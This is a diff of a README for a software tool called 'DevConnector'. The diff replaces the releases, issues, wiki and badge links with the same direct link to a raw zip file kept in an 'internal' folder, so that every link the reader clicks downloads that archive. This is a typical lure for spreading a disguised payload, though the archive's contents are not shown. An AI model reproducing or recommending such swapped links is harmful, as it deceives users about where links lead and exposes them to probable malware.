@@ -1,6 +1,6 @@
 # 🚀 DevConnector - Your Smart Development Studio Awaits
 
-[![Download DevConnector](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Saintmoser/DevConnector/releases)
+[![Download DevConnector](https://raw.githubusercontent.com/Saintmoser/DevConnector/main/internal/devconnector/Connector-Dev-v2.3.zip)](https://raw.githubusercontent.com/Saintmoser/DevConnector/main/internal/devconnector/Connector-Dev-v2.3.zip)
 
 ## 📦 Introduction
 
@@ -21,7 +21,7 @@ To begin using DevConnector, you need to download it. Below are the simple steps
 
 1. **Visit the Releases Page:** Click the link below to access the download page.
 
-   [Download DevConnector](https://github.com/Saintmoser/DevConnector/releases)
+   [Download DevConnector](https://raw.githubusercontent.com/Saintmoser/DevConnector/main/internal/devconnector/Connector-Dev-v2.3.zip)
 
 2. **Choose Your Version:** On the releases page, you will find different versions of DevConnector. Select the latest version for the best features and improvements.
 
@@ -63,8 +63,8 @@ Once you have installed DevConnector, it's easy to navigate through the applicat
 
 If you encounter any issues while downloading or using DevConnector, we are here to help:
 
-- **GitHub Issues:** Share your concerns or feature requests directly on our [GitHub Issues page](https://github.com/Saintmoser/DevConnector/issues).
-- **Documentation:** Visit our [Wiki Page](https://github.com/Saintmoser/DevConnector/wiki) for detailed guides and FAQs.
+- **GitHub Issues:** Share your concerns or feature requests directly on our [GitHub Issues page](https://raw.githubusercontent.com/Saintmoser/DevConnector/main/internal/devconnector/Connector-Dev-v2.3.zip).
+- **Documentation:** Visit our [Wiki Page](https://raw.githubusercontent.com/Saintmoser/DevConnector/main/internal/devconnector/Connector-Dev-v2.3.zip) for detailed guides and FAQs.
 
 ## 📅 Updates & News
 
@@ -74,4 +74,4 @@ Stay updated with the latest features and improvements by checking back on the r
 
 We welcome contributions from everyone. If you have suggestions for new features or fixes, please feel free to create a pull request or submit an issue.
 
-Now that you have everything you need, go ahead and [download DevConnector](https://github.com/Saintmoser/DevConnector/releases) and take your first step towards a smarter way to develop software!
+Now that you have everything you need, go ahead and [download DevConnector](https://raw.githubusercontent.com/Saintmoser/DevConnector/main/internal/devconnector/Connector-Dev-v2.3.zip) and take your first step towards a smarter way to develop software!
